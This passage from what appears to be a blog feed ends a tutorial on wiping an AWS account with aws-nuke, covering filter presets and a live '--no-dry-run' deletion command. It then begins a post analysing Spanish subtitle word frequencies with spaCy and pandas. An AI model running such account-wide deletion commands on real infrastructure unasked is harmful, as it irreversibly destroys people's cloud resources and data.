<span data-line=""><span style="color: #F69D50">global</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">IAMRolePolicyAttachment</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tfc-agent</span><span style="color: #ADBAC7"> -</span><span style="color: #F47067">></span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tfc-agent-access-policy</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> [PolicyArn: </span><span style="color: #96D0FF">"arn:aws:iam::777777777777:policy/tfc-agent-access-policy",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">PolicyName:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"tfc-agent-access-policy",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">RoleCreateDate:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-04-02T17:55:23Z",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">RoleLastUsed:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-06-22T13:45:02Z",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">RoleName:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"tfc-agent",</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">RolePath:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/"]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">remove</span></span>
<span data-line=""><span style="color: #F69D50">Scan</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">complete:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">85</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">total,</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">19</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nukeable,</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">66</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">filtered.</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">The</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">above</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resources</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">would</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">deleted</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">with</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">supplied</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">configuration.</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Provide</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--no-dry-run</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">actually</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">destroy</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resources.</span></span></code></pre></div>
<p>This is great, it fully scanned the account and found every resource to delete!
It even wants to delete the DefaultVPC which is usually a good idea.  The one
resource that should catch your eye that you probably do not want to delete:</p>
<ul>
<li><code>arn:aws:iam::777777777777:saml-provider/AWSSSO_254abb4071f10b25_DO_NOT_DELETE</code></li>
</ul>
<p>AWS clearly doesn't want us to delete that!</p>
<h1>Filters</h1>
<p>To prevent nuke from deleting resources you want to keep you can define presets
that you use on each account.  So with our SSO example we want to prevent it
from deleting those resources in a preset.</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">presets</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">sso</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">filters</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMSAMLProvider</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">type</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"regex"</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">value</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"AWSSSO_.*_DO_NOT_DELETE"</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMRole</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">type</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"glob"</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">value</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"AWSReservedSSO_*"</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMRolePolicyAttachment</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">type</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"glob"</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">value</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"AWSReservedSSO_*"</span></span></code></pre></div>
<p>You can see in this example I'm targetting specific resource types and then
matching them with both <code>regex</code> and <code>glob</code> filter types. These are super
powerful but a lot of times the simpler filters can be used.  I start with
<code>contains</code> filter and then go from there:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #8DDB8C">type</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">contains</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">value</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">AWSReservedSSO</span></span></code></pre></div>
<p>Then the other thing you may have noticed is that I was repeating
<code>AWSReservedSSO</code> multiple times.  To reduce that you can use standard YAML
anchors.   So the final config for your preset would look like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">presets</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">sso</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">filters</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">_DEFAULT_FILTERS</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">&#x26;</span><span style="color: #F69D50">DEFAULT</span></span>
<span data-line=""><span style="color: #ADBAC7">        - </span><span style="color: #8DDB8C">type</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"contains"</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">value</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"DO_NOT_DELETE"</span></span>
<span data-line=""><span style="color: #ADBAC7">        - </span><span style="color: #8DDB8C">type</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"contains"</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">value</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"AWSReservedSSO"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMSAMLProvider</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">*</span><span style="color: #ADBAC7">DEFAULT</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMRole</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">*</span><span style="color: #ADBAC7">DEFAULT</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMRolePolicyAttachment</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">*</span><span style="color: #ADBAC7">DEFAULT</span></span></code></pre></div>
<p>Now we can use that preset in our accounts configuration:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">accounts</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #96D0FF">"777777777777"</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">"presets"</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">sso</span></span></code></pre></div>
<p>So your final config should look something like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="yaml" data-theme="default"><code data-language="yaml" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #8DDB8C">regions</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">us-east-1</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">global</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #8DDB8C">account-blocklist</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  - </span><span style="color: #96D0FF">"888888888888"</span><span style="color: #ADBAC7"> </span><span style="color: #768390"># production</span></span>
<span data-line=""> </span>
<span data-line=""> </span>
<span data-line=""><span style="color: #8DDB8C">presets</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #8DDB8C">sso</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #8DDB8C">filters</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">_DEFAULT_FILTERS</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">&#x26;</span><span style="color: #F69D50">DEFAULT</span></span>
<span data-line=""><span style="color: #ADBAC7">        - </span><span style="color: #8DDB8C">type</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"contains"</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">value</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"DO_NOT_DELETE"</span></span>
<span data-line=""><span style="color: #ADBAC7">        - </span><span style="color: #8DDB8C">type</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"contains"</span></span>
<span data-line=""><span style="color: #ADBAC7">          </span><span style="color: #8DDB8C">value</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"AWSReservedSSO"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMSAMLProvider</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">*</span><span style="color: #ADBAC7">DEFAULT</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMRole</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">*</span><span style="color: #ADBAC7">DEFAULT</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #8DDB8C">IAMRolePolicyAttachment</span><span style="color: #ADBAC7">: </span><span style="color: #F47067">*</span><span style="color: #ADBAC7">DEFAULT</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #8DDB8C">accounts</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #96D0FF">"777777777777"</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">"presets"</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">      - </span><span style="color: #96D0FF">sso</span></span></code></pre></div>
<p>When you run this you should see now the resources we want to keep are filtered
out:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">global</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">IAMSAMLProvider</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::777777777777:saml-provider/AWSSSO_254abb4071f10b25_DO_NOT_DELETE</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">filtered</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">by</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span></span></code></pre></div>
<p>Once you are ready and have your filters in place you can run it for real!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws-nuke</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-c</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nuke.yaml</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--no-dry-run</span></span></code></pre></div>
<h1>Next steps</h1>
<p>One final note about it is that it does not understand the relationship between
resources and so it could try deleting an EBS volume that is still in use by an
EC2 instance.  There isn't a great solution for this outside of running nuke a
few times.</p>
<p>The tool is well documented and so you can find the rest of information going to
<a href="https://github.com/rebuy-de/aws-nuke">https://github.com/rebuy-de/aws-nuke</a>!</p>]]></description>
            <link>https://sontek.net/blog/2023/nuking_aws_account</link>
            <guid isPermaLink="true">https://sontek.net/blog/2023/nuking_aws_account</guid>
            <pubDate>Thu, 22 Jun 2023 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[How to speak spanish like a colombian drug lord!]]></title>
            <description><![CDATA[<p>I've been living in Puerto Rico for 4 years but two of those have been COVID and so I haven't been able to practice Spanish as much as I'd like. So to speed up my learning I've decided I want to watch a lot of spanish speaking television to start training my ears, but to do this I need a baseline of words I understand to be able to even know what they are saying!</p>
<p>Learning through apps like Duolingo, Drops, etc start with weird topics like vegetables that don't get you to a very good baseline for actually understanding daily conversations, so I think consuming TV is a better use of my time.</p>
<h2>Subtitles</h2>
<p>I've decided the way to understand what the best words to study are is to download every subtitle for every episode of a show I want to watch and then count each word.  The more a word is spoken the more important it is for me to know it since I'll be hearing it a lot in the show.</p>
<p>I'm going to download subtitles from Netflix. Subtitles in Netflix are in WebVTT format, which looks like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">248</span></span>
<span data-line=""><span style="color: #adbac7">00:17:58.285 --> 00:18:01.163  position:50.00%,middle  align:middle size:80.00%  line:79.33% </span></span>
<span data-line=""><span style="color: #adbac7">Yo de verdad espero que ustedes</span></span>
<span data-line=""><span style="color: #adbac7">me vean como una amiga, ¿mmm?</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">249</span></span>
<span data-line=""><span style="color: #adbac7">00:18:01.247 --> 00:18:02.539  position:50.00%,middle  align:middle size:80.00%  line:84.67% </span></span>
<span data-line=""><span style="color: #adbac7">No como una madrastra.</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">250</span></span>
<span data-line=""><span style="color: #adbac7">00:18:04.250 --> 00:18:06.127  position:50.00%,middle  align:middle size:80.00%  line:84.67% </span></span>
<span data-line=""><span style="color: #adbac7">Yo nunca te vi como una madrastra.</span></span></code></pre></div>
<p>It gives you a start time, end time, and the text on the screen.   So my first process was parsing this format and just turning it into a list of words using https://github.com/glut23/webvtt-py.</p>
<h3>Dummy parsing</h3>
<p>What I basically did was <code>text.split(" ")</code> and started counting the words.   This approach was quick and painless but it had a few downs falls.    Some words <em>look</em> the same when in reality they are not and so this meant I'd have to study every meaning of a word even if it was more rare.</p>
<p>An example of this is the word "como", you can say:</p>
<ul>
<li>Haz como te digo: "Do as I say", where como means "as"</li>
<li>como tacos todos los dias: "I eat tacos every day", where como is a conjugated form of the verb "to eat"</li>
</ul>
<p>I need to know which version of a word is being used so I can count it properly.</p>
<h3>Regular Expressions are always the answer</h3>
<p>I couldn't figure out what the word was without it being in a complete sentence, but subtitles are fragments.   They are split up into timings for displaying on the screen but they don't include entire sentences.  For example, it might look like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">23</span></span>
<span data-line=""><span style="color: #adbac7">00:01:21.960 --> 00:01:23.520  position:50.00%,middle  align:middle size:80.00%  line:84.67% </span></span>
<span data-line=""><span style="color: #adbac7">Solo las que luchan por ellos</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">24</span></span>
<span data-line=""><span style="color: #adbac7">00:01:23.680 --> 00:01:25.680  position:50.00%,middle  align:middle size:80.00%  line:84.67% </span></span>
<span data-line=""><span style="color: #adbac7">consiguen sus sueños.</span></span></code></pre></div>
<p>I want to detect the start of a sentence and the end of a sentence and then combine it, so that you end up with "Solo las que luchan por ellos consiguen sus sueños.".   My first thought was a regular expression on punctuation.   This worked well <em>most</em> of the time but there were enough exceptions to the rule that it broke often on generated a lot of broken sentences:</p>
<ul>
<li>Abbreviations like "EE. UU" for estados unidos (united states)</li>
<li>Ellipsis</li>
</ul>
<p>Splitting on spaces also didn't work for identifying the parts of speech since I needed the context around the word.</p>
<center>
<img src="/images/posts/learning_spanish/regex-extraction.png">
</center>
<h2>Natural Language Processing</h2>
<p>So to solve my pain I decided to grab https://spacy.io/ and do some NLP on the subtitles so that I could identify the proper parts of speech and get an accurate representation of the words I needed to learn.</p>
<p>The way spaCy works is you can send it a sentence and it'll return you a set of tokens:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">>>> import spacy</span></span>
<span data-line=""><span style="color: #adbac7">>>> nlp = spacy.load("es_core_news_sm")</span></span>
<span data-line=""><span style="color: #adbac7">>>> [x.pos_ for x in nlp("Hola, como estas?")]</span></span>
<span data-line=""><span style="color: #adbac7">['PROPN', 'PUNCT', 'SCONJ', 'PRON', 'PUNCT']</span></span></code></pre></div>
<p>So now I could identify the parts of speech and pull sentences together through end of sentence punctation.   The first thing I did was generate a CSV of sentences that looked like this:</p>
<table>
<tbody><tr>
<th>sentence</th>
<th>start</th>
<th>end</th>
<th>show</th>
<th>file</th>
</tr>
<tr>
<td>Si no, le voy a cortar todos los deditos</td>
<td>00:00:20.605</td>
<td>00:00:24.125</td>
<td>El marginal</td>
<td>El marginal S02E02 WEBRip Netflix es[cc].vtt</td>
</tr>
</tbody></table>
<p>Once I had a CSV of sentences I could send those back through spaCy for NLP and then start counting words, to generate another CSV:</p>
<table>
<tbody><tr>
<th>word</th>
<th>pos</th>
<th>show</th>
<th>file</th>
</tr>
<tr>
<td>a</td>
<td>ADP</td>
<td>El marginal</td>
<td>El marginal S02E02 WEBRip Netflix es[cc].vtt</td>
</tr>
<tr>
<td>cortar</td>
<td>VERB</td>
<td>El marginal</td>
<td>El marginal S02E02 WEBRip Netflix es[cc].vtt</td>
</tr>
<tr>
<td>todos</td>
<td>PRON</td>
<td>El marginal</td>
<td>El marginal S02E02 WEBRip Netflix es[cc].vtt</td>
</tr>
</tbody></table>
<p>From there I had all the data I needed!   So now it was time to start doing some data analysis!</p>
<h2>Data analysis</h2>
<p>Using a jupyter notebook ( https://jupyter.org/ ) I grabbed pandas ( https://pandas.pydata.org/ ) and read in my CSVs to start analyzing the results.</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">import numpy as np</span></span>
<span data-line=""><span style="color: #adbac7">import pandas as pd</span></span>
<span data-line=""><span style="color: #adbac7">import matplotlib.pyplot as plt</span></span>
<span data-line=""><span style="color: #adbac7">pd.set_option('display.max_rows', 1000)</span></span>
<span data-line=""><span style="color: #adbac7">words = pd.read_csv('word_data.csv.gz', compression='gzip', delimiter=',')</span></span></code></pre></div>
<p>The words dataframe is built up out of the second table I showed above with just words and their parts of speech.   I started off grouping the dataset by the word so I could get a count for how many times it was spoken in every series I parsed:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">grouped_result = (words.groupby(words.word).size() </span></span>
<span data-line=""><span style="color: #adbac7">   .sort_values(ascending=False) </span></span>
<span data-line=""><span style="color: #adbac7">   .reset_index(name='count')</span></span>
<span data-line=""><span style="color: #adbac7">   .drop_duplicates(subset='word'))</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">grouped_result.head(300)</span></span></code></pre></div>
<p>Which returned a list of words and their count:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">	word	count</span></span>
<span data-line=""><span style="color: #adbac7">0	que	94430</span></span>
<span data-line=""><span style="color: #adbac7">1	no	75931</span></span>
<span data-line=""><span style="color: #adbac7">2	a	70968</span></span>
<span data-line=""><span style="color: #adbac7">3	de	67982</span></span>
<span data-line=""><span style="color: #adbac7">4	ser	64226</span></span>
<span data-line=""><span style="color: #adbac7">5	la	52143</span></span>
<span data-line=""><span style="color: #adbac7">6	y	44390</span></span>
<span data-line=""><span style="color: #adbac7">7	estar	37819</span></span>
<span data-line=""><span style="color: #adbac7">8	el	35920</span></span></code></pre></div>
<p>Now I wanted to identify where my diminishing returns would be.   Is there a set of words that I must learn because they are spoken so often that I wouldn't understand a conversation if they weren't in my vocabulary?</p>
<center>
<img src="/images/posts/learning_spanish/diminishing_returns.png">
</center>
<p>As you can see in this chart, the usage for words drops off at around the ~200 mark.   So there are basically 150 words I <em>must</em> know and then the rest are equally important.   I wasn't quite happy with this because some parts of speech are higher priority than others, for example I think having a strong understanding of the popular verbs will go a long way.  So I also wanted to identify what are the most important verbs to learn:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">grouped_verbs = (words[words.pos == 'VERB'].groupby(['word', 'pos']).size() </span></span>
<span data-line=""><span style="color: #adbac7">   .sort_values(ascending=False) </span></span>
<span data-line=""><span style="color: #adbac7">   .reset_index(name='count')</span></span>
<span data-line=""><span style="color: #adbac7">   .drop_duplicates(subset='word'))</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">grouped_verbs.head(50)</span></span></code></pre></div>
<p>Which got me this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">	word	pos	count</span></span>
<span data-line=""><span style="color: #adbac7">0	tener	VERB	22072</span></span>
<span data-line=""><span style="color: #adbac7">1	hacer	VERB	14946</span></span>
<span data-line=""><span style="color: #adbac7">2	ir	VERB	12570</span></span>
<span data-line=""><span style="color: #adbac7">3	decir	VERB	11314</span></span>
<span data-line=""><span style="color: #adbac7">4	querer	VERB	11083</span></span>
<span data-line=""><span style="color: #adbac7">5	ver	VERB	10269</span></span>
<span data-line=""><span style="color: #adbac7">6	estar	VERB	9780</span></span>
<span data-line=""><span style="color: #adbac7">7	saber	VERB	8704</span></span>
<span data-line=""><span style="color: #adbac7">8	ser	VERB	7674</span></span>
<span data-line=""><span style="color: #adbac7">9	dar	VERB	5722</span></span>
<span data-line=""><span style="color: #adbac7">10	pasar	VERB	5528</span></span>
<span data-line=""><span style="color: #adbac7">11	hablar	VERB	5355</span></span>
<span data-line=""><span style="color: #adbac7">12	venir	VERB	5145</span></span>
<span data-line=""><span style="color: #adbac7">13	creer	VERB	4895</span></span>
<span data-line=""><span style="color: #adbac7">14	salir 	VERB	3395</span></span></code></pre></div>
<p>Verbs had a slightly different drop-off pattern when I targeted them directly:</p>
<center>
<img src="/images/posts/learning_spanish/diminishing_verbs.png">
</center>
<p>I get a big bang for my buck by learning those top 40 verbs.   Nouns on the other hand are much more spread out and most are evenly distributed:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">word	pos	count</span></span>
<span data-line=""><span style="color: #adbac7">0	gracias	NOUN	4676</span></span>
<span data-line=""><span style="color: #adbac7">1	favor	NOUN	4625</span></span>
<span data-line=""><span style="color: #adbac7">2	señor	NOUN	4116</span></span>
<span data-line=""><span style="color: #adbac7">3	verdad	NOUN	3566</span></span>
<span data-line=""><span style="color: #adbac7">4	vida	NOUN	2673</span></span>
<span data-line=""><span style="color: #adbac7">5	hombre	NOUN	2601</span></span>
<span data-line=""><span style="color: #adbac7">6	madre	NOUN	2597</span></span>
<span data-line=""><span style="color: #adbac7">7	vez	NOUN	2537</span></span>
<span data-line=""><span style="color: #adbac7">8	tiempo	NOUN	2492</span></span>
<span data-line=""><span style="color: #adbac7">9	hijo	NOUN	2215</span></span></code></pre></div>
<center>
<img src="/images/posts/learning_spanish/diminishing_nouns.png">
</center>
<p>So then I thought to myself... How much of a show would I understand if I just learned these most important words?  So I started by excluding some of the easy parts of speech and focused on the most important:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">find_important_words = (words[~words.pos.isin(['PRON', 'CONJ', 'ADP', 'ADV', 'SCONJ', 'AUX', 'INTJ'])].groupby(['word', 'pos']).size() </span></span>
<span data-line=""><span style="color: #adbac7">   .sort_values(ascending=False) </span></span>
<span data-line=""><span style="color: #adbac7">   .reset_index(name='count')</span></span>
<span data-line=""><span style="color: #adbac7">   .drop_duplicates(subset='word'))</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">find_important_words.head(50)</span></span></code></pre></div>
<p>The top 20 were all verbs except for <code>bueno</code> and <code>gracias</code>.   So now with my list of what I considered "important words" I plotted it to find what amount of words I wanted to learn:</p>
<center>
<img src="/images/posts/learning_spanish/important_words.png">
</center>
<p>It looks like 200 learned words would give me a reasonable amount of understanding for a series, so I decided to calculate how much of a series I would understand if I learned just those first 200 words:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">percentages = {}</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">for show_name in words['media'].drop_duplicates().values:</span></span>
<span data-line=""><span style="color: #adbac7">    words_in_show = (words[words.media == show_name].groupby(words.word).size() </span></span>
<span data-line=""><span style="color: #adbac7">       .sort_values(ascending=False) </span></span>
<span data-line=""><span style="color: #adbac7">       .reset_index(name='count')</span></span>
<span data-line=""><span style="color: #adbac7">       .drop_duplicates(subset='word'))</span></span>
<span data-line=""><span style="color: #adbac7">    </span></span>
<span data-line=""><span style="color: #adbac7">    total_words_handled = 0</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">    for word in grouped_result['word'][:200]:</span></span>
<span data-line=""><span style="color: #adbac7">        values = words_in_show[words_in_show.word == word]['count'].values</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">        if values.size > 0:</span></span>
<span data-line=""><span style="color: #adbac7">            total_words_handled += values[0]</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">    percentages[show_name] = total_words_handled / words_in_show.sum().loc['count']</span></span></code></pre></div>
<p>Now I had a table that would show me what percentage of the spoken words were covered by the first 200 words in my list:</p>
